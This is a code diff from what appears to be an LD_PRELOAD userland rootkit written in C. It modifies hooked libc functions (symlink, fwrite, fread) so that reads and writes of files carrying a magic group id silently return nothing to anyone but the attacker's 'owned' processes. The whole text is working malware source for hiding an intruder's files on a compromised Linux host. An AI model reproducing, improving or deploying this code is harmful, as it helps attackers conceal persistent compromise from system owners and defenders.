@@ -508,7 +508,6 @@ int symlink(const char *path1, const char *path2)
 	#endif
 	
 	struct stat filestat1, filestat2; 
-	HOOK(__xstat);
 	old___xstat(_STAT_VER, path1, &filestat1); 
 	old___xstat(_STAT_VER, path2, &filestat2); 
 	if (owned()) return old_symlink(path1, path2);
@@ -564,35 +563,35 @@ int fputs(const char *s, FILE *stream)
 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 { 
 	HOOK(fwrite); 
+	HOOK(__fxstat); 
 	#ifdef DEBUG 
 	printf("[!] fwrite hooked\n"); 
 	#endif 
 
-	if (owned()) return old_fwrite(ptr, size, nmemb, stream); 
-	char *magic = strdup(MAGIC); xor(magic); 
-	if (strstr(ptr, magic))
-	{ 
+	if (owned()) return old_fwrite(ptr, size, nmemb, stream);
+	struct stat filestat;	
+	old___fxstat(_STAT_VER, fileno(stream), &filestat);
+	if (filestat.st_gid == MAGIC){ 
 		return 0; 
 	} 
-	CLEAN(magic); 
 	return old_fwrite(ptr, size, nmemb, stream);
 }
 
 size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
 { 
 	HOOK(fread); 
+	HOOK(__fxstat);
 	#ifdef DEBUG 
 	printf("[!] fread hooked\n"); 
 	#endif 
 
 	if (owned()) return old_fread(ptr, size, nmemb, stream); 
-	char *magic = strdup(MAGIC); xor(magic); 
-	if (strstr(ptr, magic))
+	struct stat filestat; 
+	old___fxstat(_STAT_VER, fileno(stream), &filestat);
+	if (filestat.st_gid == MAGIC)
 	{ 
-		CLEAN(magic); 
 		return 0; 
 	}
-	CLEAN(magic); 
 	return old_fread(ptr, size, nmemb, stream); 
 }
 
